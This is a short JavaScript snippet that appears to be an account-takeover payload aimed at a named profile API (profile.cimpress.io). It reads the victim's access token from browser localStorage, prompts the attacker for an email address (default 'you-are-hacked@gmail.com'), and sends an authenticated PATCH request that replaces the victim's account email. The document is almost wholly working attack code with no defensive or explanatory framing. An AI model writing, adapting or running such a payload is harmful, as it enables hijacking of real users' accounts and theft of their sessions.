mrx=localStorage.getItem("vp-access-token")
mrx=JSON.parse(mrx)
token=mrx.value

emails=prompt("Enter the email you want the victim to have (default --> you-are-hacked@gmail.com)")
if (emails == ""){
  emails="you-are-hacked@gmail.com"
}

const url = 'https://profile.cimpress.io/v1/ozoDdrmewShEcbUDWX8J3V/profile/me';

const payload = {
  email: emails,
  language: 'en-US'
};

async function patchProfile() {
  try {
    const res = await fetch(url, {
      method: 'PATCH',
      mode: 'cors',                // cross-origin request
      cache: 'no-store',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
        // don't attempt to set User-Agent, Host or Referer — browser controls those
      },
      body: JSON.stringify(payload)
    });

    if (!res.ok) {
      // try to read body for more error detail
      const text = await res.text().catch(() => null);
      throw new Error(`HTTP ${res.status} ${res.statusText} - ${text || 'no body'}`);
    }

    // parse JSON response (if any)
    const data = await res.json().catch(() => null);
    console.log('Success:', data);
    return data;
  } catch (err) {
    console.error('Request failed:', err);
    throw err;
  }
}

// call it
patchProfile();
